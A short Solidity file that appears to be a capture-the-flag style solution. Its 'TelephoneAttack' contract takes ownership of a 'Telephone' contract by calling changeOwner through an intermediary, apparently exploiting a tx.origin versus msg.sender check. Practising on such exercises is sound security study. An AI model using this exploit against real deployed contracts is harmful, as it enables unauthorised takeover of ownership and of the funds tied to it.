pragma solidity ^0.4.17;

contract TelephoneAttack {
    
    Telephone _telephone;
    
    constructor(address telephoneAddress) public {
        _telephone = Telephone(telephoneAddress);
    }
    
    function takeOwnershipOfTelephone() public{
        _telephone.changeOwner(msg.sender);
    }
    
}

contract Telephone {
    function changeOwner(address _owner) public {}
}